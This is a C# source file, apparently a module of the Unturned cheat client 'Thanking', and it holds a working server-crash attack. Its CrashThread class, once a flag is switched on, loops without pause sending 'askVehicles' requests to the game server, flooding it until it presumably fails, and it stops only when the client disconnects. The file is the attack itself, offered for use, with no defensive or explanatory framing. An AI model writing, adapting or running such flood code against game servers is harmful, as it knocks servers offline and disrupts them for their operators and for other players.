using SDG.Unturned;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Thanking.Attributes;
using Thanking.Options;

namespace Thanking.Threads
{
	public static class CrashThread
	{
		public static bool CrashServerEnabled = false;

		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected += OnDisconnect;
			
			while (true)
				if (CrashServerEnabled)
					VehicleManager.instance.channel.send("askVehicles", ESteamCall.SERVER, ESteamPacket.UPDATE_RELIABLE_BUFFER, new object[0] { });
		}

		public static void OnDisconnect() =>
			CrashServerEnabled = false;
	}
}
